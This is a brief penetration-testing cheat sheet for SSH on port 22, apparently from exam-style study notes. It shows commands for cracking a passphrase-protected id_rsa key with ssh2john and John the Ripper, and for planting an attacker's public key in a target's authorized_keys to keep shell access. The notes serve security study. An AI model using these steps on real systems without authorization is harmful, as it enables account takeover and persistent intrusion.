# 22 - SSH

* id\_rsa - if password is require use ssh2john to crack it

```sh
chmod 600 id_rsa
```

```
ssh2john id_rsa > ssh.hash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```



{% code overflow="wrap" %}
```sh
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```
{% endcode %}

```sh
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

```
ssh -i id_rsa daniela@192.168.50.244
```

### Adding SSH Public key

* This can be used to get ssh session, on target machine which is based on linux

{% code overflow="wrap" %}
```shell
ssh-keygen -t rsa -b 4096 #give any password

#This created both id_rsa and id_rsa.pub in ~/.ssh directory
#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
chmod 700 ~/.ssh
nano ~/.ssh/authorized_keys #enter the copied content here
chmod 600 ~/.ssh/authorized_keys 

#On Attacker machine
ssh username@target_ip #enter password if you gave any
```
{% endcode %}
